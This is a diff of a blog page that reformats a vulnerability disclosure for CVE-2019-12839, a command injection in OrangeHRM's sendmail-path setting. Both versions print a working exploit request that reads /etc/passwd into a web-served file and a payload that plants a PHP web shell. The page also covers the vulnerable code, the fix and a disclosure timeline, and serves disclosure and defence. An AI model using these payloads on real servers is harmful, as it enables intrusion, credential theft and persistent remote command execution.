@@ -10,7 +10,7 @@
     <meta charset="utf-8">
 
 <!-- begin _includes/seo.html --><title>Arbitrary Command Execution in latest OrangeHRM platform - iam.chi</title>
-<meta name="description" content="I. OVERVIEW">
+<meta name="description" content="Overview">
 
 
   <meta name="author" content="Chi Tran">
@@ -26,7 +26,7 @@
 <meta property="og:url" content="http://localhost:4000/research/2019/06/12/ace-orangehrm.html">
 
 
-  <meta property="og:description" content="I. OVERVIEW">
+  <meta property="og:description" content="Overview">
 
 
 
@@ -249,7 +249,7 @@
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
     <meta itemprop="headline" content="Arbitrary Command Execution in latest OrangeHRM platform">
-    <meta itemprop="description" content="I. OVERVIEW">
+    <meta itemprop="description" content="Overview">
     <meta itemprop="datePublished" content="2019-06-12T00:00:00-05:00">
     
 
@@ -284,63 +284,40 @@
 
       <section class="page__content" itemprop="text">
         
-        <h3 id="i-overview"><em><strong>I. OVERVIEW</strong></em></h3>
-
-<p><strong>Author Credits: Hoang Le, Hoang Doan, Phi Le, Huy Ngo, Chi Tran</strong></p>
-
-<p><strong>Reproduced By: Chi Tran</strong></p>
-
-<table>
-  <tbody>
-    <tr>
-      <td><strong>Vendor &amp; Product:</strong> **OrangeHRM</td>
-      <td>Open Source Human Resource Management System**</td>
-    </tr>
-  </tbody>
-</table>
-
-<p><strong>Version: 4.3.1 and before</strong></p>
-
-<p><strong>CVE Reference: CVE-2019-12839</strong></p>
-
-<h3 id="ii-about-orangehrm"><em><strong>II. ABOUT ORANGEHRM</strong></em></h3>
+        <h2 id="overview">Overview</h2>
 
 <ul>
-  <li>OrangeHRM Inc. is a HR software company based in Secaucus, New Jersey. The company has developed a human resources management solution. The company offers an open-source, professional, &amp; enterprise solution. The open-source solution is free while the professional and enterprise solutions are advanced hosted solutions. OrangeHRM offers a comprehensive HR management system to suit all of your business HR needs which can also be customized according to your requirements.</li>
+  <li>Authors: Chi Tran, Hoang Le, Hoang Doan, Phi Le, Huy Ngo</li>
+  <li>Vendor &amp; Product: OrangeHRM - Open Source Human Resource Management System</li>
+  <li>Version: 4.3.1 and before</li>
+  <li>CVE Reference: CVE-2019-12839</li>
 </ul>
 
-<h3 id="iii-vulnerability-details"><em><strong>III. VULNERABILITY DETAILS</strong></em></h3>
+<h2 id="about-orangehrm">About OrangeHRM</h2>
 
-<ul>
-  <li>What is Swift Mailer? Swift Mailer integrates into any web app written in PHP (<strong>OrangeHRM</strong>), offering a flexible and elegant object-oriented approach to sending emails with a multitude of features. By default, in OrangeHRM, Swift Mailer is used to send emails using SMTP, sendmail, postfix or a custom Transport implementation of your own.</li>
-  <li>Original Git: <strong><a href="https://github.com/swiftmailer/swiftmailer/blob/master/lib/classes/Swift/Transport/SendmailTransport.php">https://github.com/swiftmailer/swiftmailer/blob/master/lib/classes/Swift/Transport/SendmailTransport.php</a></strong></li>
-  <li>An input validation error on <strong>“Path to Sendmail</strong><strong>“</strong> field via <strong>listMailConfiguration</strong> action (<strong>Authenticated</strong>) leads to a <strong>Command Injection Vulnerability (ACE)</strong> which allows attackers execute arbitrary commands.</li>
-  <li><strong>Cause:</strong> When processing requests to <strong>/listMailConfiguration</strong>, the form does not properly sanitize the certain POST parameter <strong>($form[‘txtSendmailPath’])</strong></li>
-  <li><strong>Code audit</strong>:</li>
-</ul>
+<p>OrangeHRM Inc. is a HR software company based in Secaucus, New Jersey. The company has developed a human resources management solution. The company offers an open-source, professional, &amp; enterprise solution. The open-source solution is free while the professional and enterprise solutions are advanced hosted solutions. OrangeHRM offers a comprehensive HR management system to suit all of your business HR needs which can also be customized according to your requirements.</p>
 
-<p><img src="images/HRM.png" alt="" /></p>
+<h2 id="vulnerability-detail">Vulnerability Detail</h2>
 
-<ul>
-  <li>
-    <ul>
-      <li>
-        <ul>
-          <li>As we can see above, after being supplied by an authenticated user, <strong>$form[‘txtSendmailPath’]</strong> will then be sent directly to be processed.
-            <ul>
-              <li><strong>Path to Sendmail</strong> will then be handled by:</li>
-            </ul>
-          </li>
-        </ul>
-      </li>
-    </ul>
-  </li>
-</ul>
+<p>What is Swift Mailer? Swift Mailer integrates into any web app written in PHP, offering a flexible and elegant object-oriented approach to sending emails with a multitude of features. By default, in OrangeHRM, Swift Mailer is used to send emails using SMTP, sendmail, postfix or a custom Transport implementation of your own.</p>
+
+<p>Original Git: <strong><a href="https://github.com/swiftmailer/swiftmailer/blob/master/lib/classes/Swift/Transport/SendmailTransport.php">https://github.com/swiftmailer/swiftmailer/blob/master/lib/classes/Swift/Transport/SendmailTransport.php</a></strong></p>
+
+<p>An input validation error on <code class="language-plaintext highlighter-rouge">Path to Sendmail</code>  field via <code class="language-plaintext highlighter-rouge">listMailConfiguration</code> action (<strong>Authenticated</strong>) leads to a <code class="language-plaintext highlighter-rouge">Command Injection Vulnerability (ACE)</code> which allows attackers execute arbitrary commands.</p>
+
+<p><strong>Cause:</strong> When processing requests to <code class="language-plaintext highlighter-rouge">/listMailConfiguration</code>, the form does not properly sanitize the certain POST parameter <code class="language-plaintext highlighter-rouge">($form['txtSendmailPath'])</code>
+<strong>Code audit</strong>:</p>
+
+<p><img src="/images/HRM.png" alt="" /></p>
+
+<p>As we can see above, after being supplied by an authenticated user, <code class="language-plaintext highlighter-rouge">$form['txtSendmailPath']</code> will then be sent directly to be processed.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Path to Sendmail</code> will then be handled by:</p>
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php">    <span class="k">public</span> <span class="k">function</span> <span class="n">testCommandCanBeSetAndFetched</span><span class="p">()</span>
     <span class="p">{</span>
-        <span class="nv">$buf</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="err">\</span><span class="nf">_getBuffer</span><span class="p">();</span>
-        <span class="nv">$sendmail</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="err">\</span><span class="nf">_getSendmail</span><span class="p">(</span><span class="nv">$buf</span><span class="p">);</span>
+        <span class="nv">$buf</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_getBuffer</span><span class="p">();</span>
+        <span class="nv">$sendmail</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_getSendmail</span><span class="p">(</span><span class="nv">$buf</span><span class="p">);</span>
 
         <span class="nv">$sendmail</span><span class="o">-&gt;</span><span class="nf">setCommand</span><span class="p">(</span><span class="s1">'/usr/sbin/sendmail -bs'</span><span class="p">);</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">assertEquals</span><span class="p">(</span><span class="s1">'/usr/sbin/sendmail -bs'</span><span class="p">,</span> <span class="nv">$sendmail</span><span class="o">-&gt;</span><span class="nf">getCommand</span><span class="p">());</span>
@@ -348,25 +325,22 @@
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">assertEquals</span><span class="p">(</span><span class="s1">'/usr/sbin/sendmail -oi -t'</span><span class="p">,</span> <span class="nv">$sendmail</span><span class="o">-&gt;</span><span class="nf">getCommand</span><span class="p">());</span>
     <span class="p">}</span></code></pre></figure>
 
+<p>This means, we can modify <code class="language-plaintext highlighter-rouge">Path to Sendmail</code> to have arbitrary commands leaded by either:</p>
 <ul>
-  <li>This means, we can modify <strong>Path to Sendmail</strong> to have arbitrary commands leaded by either:</li>
-  <li>
-    <p>/usr/sbin/sendmail -bs or /usr/sbin/sendmail -oi -t</p>
-  </li>
-  <li>
-    <p>An action of sending a test mail will execute the arbitrary commands to extract sensitive information as well as take over the server.</p>
-  </li>
-  <li>
-    <ul>
-      <li><strong>Proof of Concepts:</strong></li>
-    </ul>
-  </li>
-  <li>Request:
-```
-POST /symfony/web/index.php/admin/listMailConfiguration HTTP/1.1
+  <li><code class="language-plaintext highlighter-rouge">/usr/sbin/sendmail -bs</code> or <code class="language-plaintext highlighter-rouge">/usr/sbin/sendmail -oi -t</code></li>
+</ul>
+
+<p>An action of sending a test mail will execute the arbitrary commands to extract sensitive information as well as take over the server.</p>
+
+<p><strong>Proof of Concepts:</strong></p>
+<ul>
+  <li>Request:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /symfony/web/index.php/admin/listMailConfiguration HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Referer: http://localhost/symfony/web/index.php/admin/listMailConfiguration
@@ -374,11 +348,10 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 767
 Connection: close
 Cookie: Loggedin=True; PHPSESSID=r1rp9com2a4n10lpbhjvfnelg4
-Upgrade-Insecure-Requests: 1</li>
-</ul>
+Upgrade-Insecure-Requests: 1
 
-<p>emailConfigurationForm%5B_csrf_token%5D=426bbe900f93c903be83b3c6d4d1bcd0&amp;emailConfigurationForm%5BtxtMailAddress%5D=myusername%40localhost&amp;emailConfigurationForm%5BcmbMailSendingMethod%5D=sendmail&amp;emailConfigurationForm%5BtxtSendmailPath%5D=<strong>%2Fusr%2Fsbin%2Fsendmail+-bs%3B+%2Fbin%2Fcat+%2Fetc%2Fpasswd+%3E%3E+%2Fvar%2Fwww%2Fhtml%2Fexpose.txt</strong>&amp;emailConfigurationForm%5BtxtSmtpHost%5D=localhost&amp;emailConfigurationForm%5BtxtSmtpPort%5D=25&amp;emailConfigurationForm%5BoptAuth%5D=login&amp;emailConfigurationForm%5BtxtSmtpUser%5D=myusername&amp;emailConfigurationForm%5BtxtSmtpPass%5D=********&amp;emailConfigurationForm%5BoptSecurity%5D=none&amp;emailConfigurationForm%5BchkSendTestEmail%5D=on&amp;emailConfigurationForm%5BtxtTestEmail%5D=root%40localhost
-```</p>
+emailConfigurationForm%5B\_csrf\_token%5D=426bbe900f93c903be83b3c6d4d1bcd0&amp;emailConfigurationForm%5BtxtMailAddress%5D=myusername%40localhost&amp;emailConfigurationForm%5BcmbMailSendingMethod%5D=sendmail&amp;emailConfigurationForm%5BtxtSendmailPath%5D=**%2Fusr%2Fsbin%2Fsendmail+-bs%3B+%2Fbin%2Fcat+%2Fetc%2Fpasswd+%3E%3E+%2Fvar%2Fwww%2Fhtml%2Fexpose.txt**&amp;emailConfigurationForm%5BtxtSmtpHost%5D=localhost&amp;emailConfigurationForm%5BtxtSmtpPort%5D=25&amp;emailConfigurationForm%5BoptAuth%5D=login&amp;emailConfigurationForm%5BtxtSmtpUser%5D=myusername&amp;emailConfigurationForm%5BtxtSmtpPass%5D=\*\*\*\*\*\*\*\*&amp;emailConfigurationForm%5BoptSecurity%5D=none&amp;emailConfigurationForm%5BchkSendTestEmail%5D=on&amp;emailConfigurationForm%5BtxtTestEmail%5D=root%40localhost
+</code></pre></div></div>
 
 <ul>
   <li>Steps to reproduce:</li>
@@ -386,57 +359,46 @@ Upgrade-Insecure-Requests: 1</li>
 
 <p>1 - Navigate to <a href="http://localhost/symfony/web/index.php/admin/listMailConfiguration">http://localhost/symfony/web/index.php/admin/listMailConfiguration</a></p>
 
-<p><img src="images/LIST.png" alt="" /></p>
+<p><img src="/images/LIST.png" alt="" /></p>
 
-<p>2 - Edit “Path to Sendmail” to have the following payload (limit 100 chars)
-/usr/sbin/sendmail -bs; <strong>/bin/cat /etc/passwd</strong> » /var/www/html/expose.txt</p>
+<p>2 - Edit <code class="language-plaintext highlighter-rouge">Path to Sendmail</code> to have the following payload (limit 100 chars)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/sendmail -bs; /bin/cat /etc/passwd &gt;&gt; /var/www/html/expose.txt
+</code></pre></div></div>
 
-<p>3 - Update “Test Email Address” to send a test mail</p>
+<p>3 - Update <code class="language-plaintext highlighter-rouge">Test Email Address</code> to send a test mail</p>
 
-<p><img src="images/SENT.png" alt="" /></p>
+<p><img src="/images/SENT.png" alt="" /></p>
 
-<p><img src="images/exposed.png" alt="" /></p>
+<p><img src="/images/exposed.png" alt="" /></p>
 
-<h3 id="iv-impact"><em><strong>IV. IMPACT</strong></em></h3>
+<h2 id="impact">Impact</h2>
 
-<ul>
-  <li>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</li>
-</ul>
+<p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p>
 
-<h3 id="v-compromise-the-server-low-priv-shell"><em><strong>V. COMPROMISE THE SERVER (LOW-PRIV SHELL)</strong></em></h3>
-
-<ul>
-  <li>
-    <ul>
-      <li>
-        <p>Payload:</p>
-
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/sendmail -bs;echo "&lt;?php if(\\$\_GET\['c'\]){system(\\$\_GET\['c'\]);}?&gt;" &gt;&gt; /var/www/html/c.php
-</code></pre></div>        </div>
-      </li>
-    </ul>
-  </li>
-</ul>
-
-<p><img src="images/HRMShell.png" alt="" /></p>
-
-<p><img src="images/installHRM.png" alt="" /></p>
-
-<h3 id="v-remediation"><em><strong>V. REMEDIATION</strong></em></h3>
+<h2 id="low-priv-shell">Low-priv shell</h2>
 
 <ul>
-  <li><a href="https://github.com/orangehrm/orangehrm/pull/528">https://github.com/orangehrm/orangehrm/pull/528</a></li>
+  <li>Payload:</li>
 </ul>
 
-<h3 id="vi-report-timeline"><em><strong>VI. REPORT TIMELINE</strong></em></h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/sendmail -bs;echo "&lt;?php if(\\$\_GET\['c'\]){system(\\$\_GET\['c'\]);}?&gt;" &gt;&gt; /var/www/html/c.php
+</code></pre></div></div>
 
-<ul>
-  <li>06/11/ 2019: VSS Team discovered the vulnerability</li>
-  <li>06/12/2019: Reported to Vendor</li>
-  <li>06/13/2019: Vendor confirmed</li>
-  <li>06/14/2019: Vendor released a fix</li>
-  <li>06/15/2019: CVE ID assigned</li>
-</ul>
+<p><img src="/images/HRMShell.png" alt="" /></p>
+
+<p><img src="/images/installHRM.png" alt="" /></p>
+
+<h2 id="remediation">Remediation</h2>
+
+<p><a href="https://github.com/orangehrm/orangehrm/pull/528">https://github.com/orangehrm/orangehrm/pull/528</a></p>
+
+<h2 id="report-timeline">Report Timeline</h2>
+
+<p>06/11/2019: Discovered the vulnerability<br />
+06/12/2019: Reported to Vendor<br />
+06/13/2019: Vendor confirmed<br />
+06/14/2019: Vendor released a fix<br />
+06/15/2019: CVE ID assigned</p>
 
         
       </section>
@@ -486,45 +448,6 @@ Upgrade-Insecure-Requests: 1</li>
     <div class="page__related">
       <h4 class="page__related-title">You May Also Enjoy</h4>
       <div class="grid__wrapper">
-        
-          
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/jekyll/update/2023/01/26/welcome-to-jekyll.html" rel="permalink">Welcome to Jekyll!
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-
-    
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
-        
-          less than 1 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different wa...</p>
-  </article>
-</div>
-
         
           
 
@@ -642,7 +565,48 @@ Upgrade-Insecure-Requests: 1</li>
   </p>
 
 
-    <p class="archive__item-excerpt" itemprop="description">I. SUMMARY
+    <p class="archive__item-excerpt" itemprop="description">Vulnerability Summary
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/research/2021/08/21/zdi-21-977-d-link-dap-2020-webproc-stack-based-bof-rce.html" rel="permalink">[ZDI-21-977] D-Link DAP-2020 webproc Stack-based BOF RCE
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Overview
 
 </p>
   </article>
